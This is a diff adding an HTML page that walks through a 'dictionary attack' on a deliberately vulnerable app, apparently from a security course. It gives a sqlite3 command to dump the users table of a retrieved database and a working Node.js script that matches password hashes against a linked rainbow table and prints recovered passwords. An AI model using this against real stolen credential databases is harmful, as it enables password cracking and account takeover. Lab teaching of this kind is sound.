@@ -1,0 +1,47 @@
+<h1>Dictionary Attack</h1>
+
+<pre>
+  Requirements: 
+    - Retrieved database file.
+    - Having a rainbow table in a <em>.txt</em> or similar file. (<em>rainbowTable.txt</em> can be found <a href="https://drive.google.com/file/d/1LOxpHaEufVmuQvYCjnRgIGHOksTxWoDF/view?usp=sharing" target="_blank">here</a>)
+
+  Example attack:
+  1. Once you obtained the database file, you can run the following command which will save the content of the users table into the <em>users.csv</em> file:
+
+    sqlite3 -header -csv ~/application_security/app-vulnerable/database.db "select * from users;" > users.csv
+
+  2. Create a JavaScript script file (e.g. <em>dictionary_attack.js</em>) and paste the following code:
+
+    const fs = require('fs')
+    const csvData = fs.readFileSync('/home/pero/users.csv', 'utf8')                    // Path to file might need to be modified.
+    const rainbowData = fs.readFileSync('/home/pero/rainbowTable.txt', 'utf8')         // Path to file might need to be modified, and thus name of your rainbow table file.
+    const linesDatabase = csvData.trim().split('\n')
+    const passwordLines = rainbowData.trim().split('\n')
+    
+    for (let i = 1; i < linesDatabase.length; i++) {
+        const fields = linesDatabase[i].split(',')
+        const passwordHash = fields[2].trim()
+        let found = false
+        let realPassword = ''
+        
+        for (let j = 0; j < passwordLines.length; j++) {
+            const lineFields = passwordLines[j].split(':')
+            const lineHash = lineFields[1].trim()
+        
+            if (passwordHash === lineHash) {
+                realPassword = lineFields[0].trim()
+                found = true
+                break
+            }
+        }
+
+        if (found) {
+            console.info(`Hash: ${passwordHash} that represents password: ${realPassword} found in rainbowTable.txt file.`)
+        } else {
+            console.info(`Password with hash: ${passwordHash} not found in rainbowTable.txt file.`)
+        }
+    }
+
+  3. Run the script: node dictionary_attack.js
+  4. If found in rainbow table, passwords will be printed in console.
+</pre>
